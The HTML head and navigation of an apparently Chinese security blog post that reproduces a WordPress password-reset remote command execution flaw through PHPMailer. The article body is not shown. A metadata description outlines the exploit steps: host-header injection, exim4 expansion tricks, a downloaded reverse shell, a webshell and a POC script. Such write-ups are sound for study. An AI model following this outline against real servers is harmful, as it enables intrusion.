<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>WordPress 远程命令执行漏洞复现(CVE-2018-15877) | hybcx</title><meta name="keywords" content="CVE"><meta name="author" content="hybcx,19815455497@163.com"><meta name="copyright" content="hybcx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="WordPress 远程命令执行漏洞复现(CVE-2018-15877)"><meta name="application-name" content="WordPress 远程命令执行漏洞复现(CVE-2018-15877)"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="WordPress 远程命令执行漏洞复现(CVE-2018-15877)"><meta property="og:url" content="http://hybcx.xyz/2023/08/25/wordpress-yuan-cheng-ming-ling-zhi-xing-lou-dong-fu-xian-cve-2018-15877/index.html"><meta property="og:site_name" content="hybcx"><meta property="og:description" content="0x01 漏洞简述  WordPress 是一种使用 PHP 语言开发的博客平台，用户可以在支持 PHP 和 MySQL 数据库的服务器上架设属于自己的网站。也可以把 WordPress 当作一个内容管理系统（CMS）来使用。WordPress 使用 PHPMailer 组件向用户发送邮件。PHPM"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta property="article:author" content="hybcx"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta name="description" content="0x01 漏洞简述  WordPress 是一种使用 PHP 语言开发的博客平台，用户可以在支持 PHP 和 MySQL 数据库的服务器上架设属于自己的网站。也可以把 WordPress 当作一个内容管理系统（CMS）来使用。WordPress 使用 PHPMailer 组件向用户发送邮件。PHPM"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://hybcx.xyz/2023/08/25/wordpress-yuan-cheng-ming-ling-zhi-xing-lou-dong-fu-xian-cve-2018-15877/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?d98ea8480e5ec98a243adfc7bd46b93a";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = {
  linkPageTop: {"enable":true,"title":"向✌们无限学习","addFriendPlaceholder":"昵称（请勿包含博客等字样）：\n网站地址（要求博客地址，请勿提交个人主页）：\n头像图片url（请提供尽可能清晰的图片，我会上传到我自己的图床）：\n描述：\n站点截图（可选）：\n"},
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: {"enable":true,"ck":"3JLPGIZJOJw6Nvu2","LingQueMonitorID":"3JLPOLHV5W6IAty5"},
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    simplehomepage: false,
    post: true
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: hybcx","link":"链接: ","source":"来源: hybcx","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'hybcx',
  title: 'WordPress 远程命令执行漏洞复现(CVE-2018-15877)',
  postAI: '',
  pageFillDescription: '0x01 漏洞简述, 漏洞触发条件：, 0x02 漏洞搭建, 0x03 漏洞原理, 0x04 漏洞复现, EXP, 利用, 复现, 反弹 shell, 写入一句话webshell, 0x05 POC, 脚本需要修改的部分, 脚本的主要流程：, 0x06 漏洞原理深入, 0x07 参考文章漏洞简述是一种使用语言开发的博客平台用户可以在支持和数据库的服务器上架设属于自己的网站也可以把当作一个内容管理系统来使用使用组件向用户发送邮件版本存在远程命令执行漏洞攻击者只需巧妙地构造出一个恶意邮箱地址即可写入任意文件造成远程命令执行的危害漏洞编号影响版本漏洞触发条件没有开启默认攻击者需要知道服务部署的路径成功利用该漏洞后攻击者可以远程任意代码执行漏洞搭建这里我采用靶场搭建进入到目录后我们执行命令访问对应端口即可记得安全组放行进去之后按要求配置信息即可随后在转到忘记密码页面漏洞原理远程命令执行漏洞复现此处是管理员重置密码页面使用组件进行重置密码邮件的发送但是之前的版本存在命令注入漏洞具体你可以先阅读分析文章链接我们来看看这个漏洞在中的情况漏洞文件是我们在中搜索查看这个文件该文件在在目录下我们可以发现几行关键代码我们发现实际上组件是调用系统命令进行邮件发送命令格式为并且我们继续审计代码发现函数通过传入的参数来获取主机名该主机名即请求报文中的值但是参数并没有经过任何过滤因此我们可以进行任意构造拼接从而产生了系统命令注入漏洞更棒的是提供了和参数参数用于写入日志文件我们可以使用命令组合它会将发送的邮件保存到中那么在请求的时候应该类似于这样在前面如果加上括号将可以引入空格这样就可以拼接到了命令中并且保存了测试邮件文件那么如果我们写入的是后门文件呢思路很好然而现实很无奈方面以及库方面都会防止攻击者注入空字符空格或到命令中并且添加括号引入向中注入参数的方法已经行不通了具体可以参考链接比如我们想要调用的时候也会出问题因为字段中如果出现服务器会拒绝我们的请求因此上述的技术在这种情况下不起作用这条路走不通了正感觉走投无路的时候这时候我们不妨喝杯茶冷静一下为什么能够产生命令注入漏洞呢我们去了解一下然后就会发现柳暗花明又一村了我们可以知道系统中已经使用替代了的功能我们查看文件可以发现它是一个链向的软链接文件远程命令执行漏洞复现那么我们可以利用的语法参数进行命令执行参数的拼接啊我们查看的帮助手册可以发现参数下面同样也是与的原理我们可以知道系统中已经使用替代了的功能我们查看文件可以发现它是一个链向的软链接文件远程命令执行漏洞复现那么我们可以利用的语法参数进行命令执行参数的拼接啊我们查看的帮助手册可以发现参数简单来说参数是一个字符串拓展测试命令它可以读取一些变量的数据比如它可以显示系统时间并且提供了一些函数用来执行一些命令如字符串截取函数系统调用函数我们可以截取空格字符如图所示函数从第十个字符开始截取共截取一个字符也就是时间字符串的第个字符是空格字符远程命令执行漏洞复现那么同理我们也可以截取字符串远程命令执行漏洞复现我们测试使用函数调用系统命令远程命令执行漏洞复现到这里遇到的问题都解决了漏洞复现要执行的命令我们在数据包中将要执行的命令插入到上述中指定的位置就可以实现命令执行了但是这个漏洞的利用存在很大的限制主要限制如下所示执行的命令不能包含大量特殊字符如引号等命令会被转换成小写字母命令需要使用绝对路径需要知道某一个存在的用户的用户名我们处理后的命令会执行但是不会显示到页面上为了解决这些坑漏洞作者想出了利用代替用代替空格的方法但是还是有很多字符不能用所以我们需要将待执行的命令放到第三方网站中然后通过的方法先将他下载到目录中再去执行利用所以总体来说利用过程如下编写反弹的放到某个网页里有如下要求整个的大写字母会被转换成小写所以大写小敏感的系统不要使用大写字母做文件路径访问该网页不能跳转因为跳转的参数是大写拼接成命令和命令将上述命令中的空格和转换成和拼接成包的头依次发送这两个拼接好的数据包复现漏洞缺陷处在后台找回密码的地方初始化管理员用户名和密码后访问点击忘记密码界面远程命令执行漏洞复现这里用户名为我们于是可以构造如下该在目录下创建文件空格转换过来就是远程命令执行漏洞复现在目录下发现成功生成了测试文件远程命令执行漏洞复现反弹利用或者命令下载远程文件测试下载反弹注意攻击机启用服务远程中不能有所有字母必须小写远程反弹脚本内容执行反弹两个转换过来就是在反弹主机上用监听端口分别按顺序提交即可获取到反弹远程命令执行漏洞复现写入一句话内容同理可以直接下载一句话然后菜刀连接转换过来即远程命令执行漏洞复现自动化提交获取反弹通过建立服务用于目标下载运行是需要用管理员权限因为监听了端口使用方法攻击机上运行即可其中为靶机的根地址脚本需要修改的部分三个地方第一处这边要替换成你的攻击机的地址一般是和靶机处在一个局域网内的可以提前访问下的网站进行测试第二处第三处这两个地方主要要修改的可能是这个参数这个里默认的是这里其实就是你装时管理员的或者任意一个用户的邮箱因为找回密码时他会先判断邮箱是否存在再进行下一步如果这里邮箱不存在你发包是返回告诉你邮箱不存在如果是存在有的邮箱就是返回跳转到输入邮箱密码的界面同时告诉你邮件已经发了下面是模拟攻击时候的抓包返回的是时说明已经命令执行成功远程命令执行漏洞复现可以看到靶机上也确实出现了文件这边执行的命令是远程命令执行漏洞复现这三个地方改好了之后脚本就可以运行了脚本的主要流程生成本地里面写的是是建立连接的命令命令执行第一次攻击机获取写到目录下命令执行第二次运行目录下的连接靶机漏洞原理深入将中的源码拷贝出来根据忘记密码页面的定位到的函数此函数是对密码的操作函数此函数中对用户输入进行处理后最后通过以下代码发送邮件跟进函数定位到函数中其中关于的设置如下根据代码可以看出基于来构造发送邮件的域前面拼接上参数是通过请求头字段传入并且这里只是简单的使用去掉了前面的没有任何过滤措施在中添加代码来查看的值在下图中看到就是字段的值远程命令执行漏洞复现接着跟进函数定位到发现其用到了组件函数如下这个函数对数据进行校验没问题的话设置变量为变量的值其中函数在同文件下函数前半部分如下经过测试发现变量被设置为因此在函数后面执行如下代码中的的的代码注释基于内置的邮箱验证的基础上做的修改查阅官网远程命令执行漏洞复现这个验证方式允许使用括号或双引号使邮箱地址包含空格因此在字段构造的发件人的邮箱可以是经过验证和过滤之后的函数调用将传入到函数中函数代码如下由于没有开启安全模式因此调用的是是调用原生的在中定义查阅手册对第五个参数有如下描述参数可用于将附加标志作为命令行选项传递给配置为在发送邮件时使用的程序如配置设置所定义的那样例如当使用带有选项的时可以使用它来设置信封发送者地址该参数通过在内部转义以防止命令执行阻止命令的执行但是允许添加额外的参数出于安全考虑建议用户对该参数进行消毒以避免向命令添加不必要的参数实际上组件是调用系统命令进行邮件发送命令格式为执行后会执行这样的指令过滤后的数据包头中的字段值另外符号链接到的参数能开启字符串扩展测试模式允许提取一些变量数据返回系统时间返回路径值因此可以用代替空格代替斜杠来绕过后面参数中空格和斜杠以及可以运行程序因此上面提到的因此上面提到的最后变成这样就可以执行中的命令如果直接在命令行里使用需要给加引号远程命令执行漏洞复现参考文章任意命令执行漏洞复现命令执行漏洞复现分析任意命令执行漏洞深入分析命令执行漏洞远程代码执行漏洞',
  isPost: true,
  isHome: false,
  isHighlightShrink: true,
  isToc: true,
  postUpdate: '2023-11-12 09:42:36',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">hybcx</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 1.05rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 1.05rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.05rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 1.05rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 1.05rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 1.05rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 1.05rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 1.05rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 1.05rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 1.05rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 1.05rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 1.05rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">16</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">六月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">9</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">五月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">18</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a 